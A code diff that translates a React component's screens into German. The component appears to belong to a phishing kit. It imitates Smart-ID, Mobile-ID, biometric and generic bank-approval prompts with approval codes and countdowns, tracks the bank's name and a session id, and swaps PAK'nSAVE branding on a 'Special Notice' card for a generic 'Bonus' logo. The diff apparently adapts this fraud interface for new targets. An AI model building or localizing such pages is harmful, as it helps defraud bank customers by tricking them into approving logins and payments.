@@ -108,17 +108,17 @@ function SmartIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Open the Smart-ID app on your phone.
+            Öffnen Sie die Smart-ID-App auf Ihrem Telefon.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Confirm with {pinLabel}</p>
+          <p className="text-[1.08rem] text-[#667085]">Mit {pinLabel} bestätigen</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -127,7 +127,7 @@ function SmartIdApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Confirming..." : "Confirm"}
+            {saving ? "Wird bestätigt..." : "Bestätigen"}
           </button>
         </div>
       </div>
@@ -152,15 +152,15 @@ function GenericApprovalCard({
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
         <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
-        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Confirmation required</h1>
-        <p className="mb-6 text-base text-[#667085]">To continue, confirm the verification code shown on your device.</p>
+        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Bestätigung erforderlich</h1>
+        <p className="mb-6 text-base text-[#667085]">Bestätigen Sie zum Fortfahren den auf Ihrem Gerät angezeigten Verifizierungscode.</p>
 
         <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
           {approvalCode || "0000"}
         </div>
 
         <p className="mb-6 text-sm text-[#667085]">
-          Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+          Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
         </p>
 
         <button
@@ -169,7 +169,7 @@ function GenericApprovalCard({
           disabled={saving}
           className="w-full rounded-[12px] bg-[#1464f4] px-4 py-4 text-base font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
         >
-          {saving ? "Confirming..." : "Confirm"}
+          {saving ? "Wird bestätigt..." : "Bestätigen"}
         </button>
       </div>
     </div>
@@ -198,17 +198,17 @@ function MobileIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Open the Mobile-ID app on your phone.
+            Öffnen Sie die Mobile-ID-App auf Ihrem Telefon.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Confirm with {pinLabel}</p>
+          <p className="text-[1.08rem] text-[#667085]">Mit {pinLabel} bestätigen</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -217,7 +217,7 @@ function MobileIdApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Confirming..." : "Confirm"}
+            {saving ? "Wird bestätigt..." : "Bestätigen"}
           </button>
         </div>
       </div>
@@ -263,17 +263,17 @@ function BiometricApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Biometric verification
+            Biometrische Verifizierung
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Confirm with {pinLabel}</p>
+          <p className="text-[1.08rem] text-[#667085]">Mit {pinLabel} bestätigen</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -282,7 +282,7 @@ function BiometricApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "Confirming..." : "Confirm"}
+            {saving ? "Wird bestätigt..." : "Bestätigen"}
           </button>
         </div>
       </div>
@@ -297,14 +297,14 @@ function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: s
         <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
           <div className="mb-4 flex items-start justify-between gap-4 text-left">
             <div>
-              <p className="text-[0.72rem] font-black uppercase tracking-[0.24em] text-[#ffe98c]">Customer Support</p>
+              <p className="text-[0.72rem] font-black uppercase tracking-[0.24em] text-[#ffe98c]">Kundensupport</p>
               <h1 className="mt-3 text-3xl font-extrabold uppercase leading-[0.95] tracking-[-0.03em] text-white sm:text-[2.65rem]">
-                Special Notice
+                Wichtiger Hinweis
               </h1>
             </div>
             <img
-              src="/form-assets/paknsave-logo-form.png"
-              alt="PAK'nSAVE"
+              src="/form-assets/logo-form.svg"
+              alt="Bonus"
               className="pak-form-brand-logo shrink-0"
             />
           </div>
@@ -319,12 +319,12 @@ function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: s
             <svg className="h-7 w-7 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
               <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
             </svg>
-            <span>Your request is being reviewed securely by PAK'nSAVE support.</span>
+            <span>Ihre Anfrage wird sicher von unserem Support geprüft.</span>
           </div>
 
           {imageUrl ? (
             <div className="mt-5 overflow-hidden rounded-2xl border border-white/10 bg-white/5 p-1 shadow-sm">
-              <img src={imageUrl} alt="Support notice" className="mx-auto h-auto w-full rounded-xl object-contain" />
+              <img src={imageUrl} alt="Support-Hinweis" className="mx-auto h-auto w-full rounded-xl object-contain" />
             </div>
           ) : null}
         </div>
@@ -346,7 +346,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     approvalCode: "",
     bankSlug: "",
     bankName: "",
-    message: "Please wait...",
+    message: "Bitte warten...",
     imageUrl: null,
     lang: "en",
   });
@@ -388,7 +388,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         approvalCode: fd.approvalCode?.trim() ?? "",
         bankSlug: fd.bankSlug?.trim() ?? "",
         bankName: fd.bankName?.trim() ?? "",
-        message: fd.specialNoticeText ?? fd.customMessage ?? "Please wait...",
+        message: fd.specialNoticeText ?? fd.customMessage ?? "Bitte warten...",
         imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
         lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "en",
       });
@@ -505,7 +505,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   if (viewState.approvalStatus) {
     return (
       <GenericApprovalCard
-        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Confirmation"}
+        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Bestätigung"}
         approvalCode={viewState.approvalCode}
         secondsLeft={secondsLeft}
         saving={saving}
